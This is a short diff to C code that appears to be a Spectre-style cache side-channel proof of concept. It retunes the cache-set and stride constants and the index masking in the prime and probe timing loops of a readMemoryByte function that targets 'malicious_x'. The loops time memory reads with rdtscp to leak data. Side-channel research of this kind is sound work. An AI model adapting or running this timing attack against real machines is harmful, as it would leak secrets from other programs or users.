@@ -8,9 +8,10 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DIST 128
-#define SET 256
+#define DIST 256
+#define SET 32
 #define WAY 8
+#define INDEX 16
 
 /********************************************************************
 Victim code.
@@ -73,7 +74,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	// prime data over cache
 	printf("priming...\n");
 	for( i=0;i<SET;i++) {
-      	mix_i = ((i * 167) + 13) & 255;
+      	mix_i = ((i * 167) + 13) & (SET-1);
 		time1 = __rdtscp(&junk);
 		temp&= array2[mix_i * DIST];
 		time2 = __rdtscp(&junk) - time1;
@@ -101,7 +102,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	printf("probing...\n");
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < SET; i++) {
-      mix_i = ((i * 167) + 13) & 255;
+      mix_i = ((i * 167) + 13) & (SET-1);
       addr = & array2[mix_i * DIST];
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
